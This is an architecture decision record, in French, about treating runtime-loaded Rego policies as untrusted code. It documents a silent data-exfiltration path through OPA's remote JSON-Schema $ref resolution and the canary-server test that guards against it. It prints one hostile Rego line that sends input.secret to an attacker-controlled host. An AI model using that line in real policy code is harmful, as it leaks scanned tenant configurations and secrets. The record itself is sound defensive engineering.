# ADR-0021 — Une règle chargée à l'exécution est du code non fiable, et son refus réseau se mesure

```yaml
status: Accepted
date: 2026-09-09
scope:
  - security
  - engine
```

## Contexte

`--policy-dir` charge des règles Rego **à chaud**, sans recompilation. Ce sont des
tiers, et elles s'évaluent sur un inventaire qui contient tout ce que le scan a
collecté : user-data, politiques IAM, configurations complètes d'un tenant.

Le moteur retirait `http.send`, `net.lookup_ip_addr` et `opa.runtime` de son jeu de
capacités, et l'annonçait comme un refus réseau. **C'était faux.** OPA résout le `$ref`
distant d'un JSON-Schema par HTTP **au moment de l'évaluation**, sur un chemin
qu'aucun builtin ne garde :

```rego
json.match_schema(input, {"$ref": sprintf("%s/leak/%s", [attaquant, input.secret])})
```

Mesuré avec un serveur témoin contre la version alors épinglée : la requête partait,
l'inventaire sortait, et `Evaluate` ne rendait **aucune erreur**. Le silence est la
partie qui compte — rien, chez un consommateur, dans un log de CI ou dans un code de
sortie, n'aurait paru anormal.

Cet ADR est distinct de l'ADR-0016, et la distinction est le sujet : celui-ci porte sur
ce que Pépin **publie**, celui-là sur ce que Pépin **exécute**. Le modèle de menace y
est inversé.

## Décision

Une règle chargée à l'exécution est traitée comme du **code non fiable**.

Le refus réseau ne se déduit pas d'un jeu de capacités : il se **mesure**, avec un
serveur témoin, à chaque build. Et l'**épinglage** de `scankit` est une frontière de
sécurité, pas une simple dépendance : une remontée de version en arrière rouvre la
brèche.

## Justification

Lire une liste de capacités ne prouve rien. C'est précisément ce qui a échoué : la liste
était juste, le refus qu'elle était censée produire ne l'était pas, et le chemin qui
restait ouvert ne passait par aucun builtin. Un témoin qui reste muet prouve quelque
chose ; une lecture de source prouve qu'on a lu.

L'épinglage mérite d'être nommé comme frontière parce que sa régression est
**silencieuse** : rien d'autre ne rougirait. Une garde adossée à un témoin le voit, une
revue de `go.mod` non.

## Alternatives écartées

**Se fier au jeu de capacités comme documentation du refus.** Rejeté : c'est exactement
ce qui a produit l'incident. Un refus annoncé et non éprouvé est un refus supposé.

**Isoler l'évaluation entière (bac à sable, espace de noms réseau).** Rejeté pour
l'instant : coût d'exploitation élevé, portabilité incertaine, et le refus au niveau du
chargeur de schémas couvre le chemin réel. À rouvrir si un second chemin apparaît —
auquel cas la question ne sera plus « faut-il un bac à sable » mais « lequel ».

**Autoriser une liste d'hôtes.** Rejeté : aucune règle de posture n'a de raison
légitime d'atteindre le réseau, et une liste devient une porte qu'on élargit.

**Interdire `--policy-dir`.** Rejeté : les règles externes sont une fonctionnalité
assumée. Le problème n'est pas qu'elles existent, c'est qu'on les croyait inoffensives.

## Conséquences

Une garde tend un témoin plutôt que de lire le code, et elle est éprouvée **dans les
deux sens** : verte sur la version corrigée, elle rapporte la requête reçue quand le
module est ramené à la version vulnérable.

**Une carence de mise à jour uniforme retarde aussi les correctifs de sécurité.** Le
correctif existait en amont depuis cinq jours ; Dependabot fonctionnait, et sa carence
de sept jours le retenait, aucun avis CVE ne le distinguant d'une montée ordinaire. La
carence des versions de **correctif** est donc raccourcie : c'est là que les correctifs
de sécurité arrivent, et une version de correctif est aussi celle dont la régression
coûte le moins cher à annuler.

## Invariants

- Aucune règle chargée à l'exécution n'atteint le réseau.
- Le refus réseau est mesuré par un témoin, jamais déduit d'une liste de capacités.
- Une régression de l'épinglage de `scankit` fait rougir une garde.

*Garde : `TestNoThirdPartyPolicyCanReachTheNetwork`.*

## Validation

Serveur témoin, même règle hostile, deux versions du moteur : requête reçue sur l'une,
aucune sur l'autre.

## Liens

ADR-0002 (moteur partagé `scankit`) · ADR-0016 (chaîne d'approvisionnement publiée) ·
issues #146, #147.
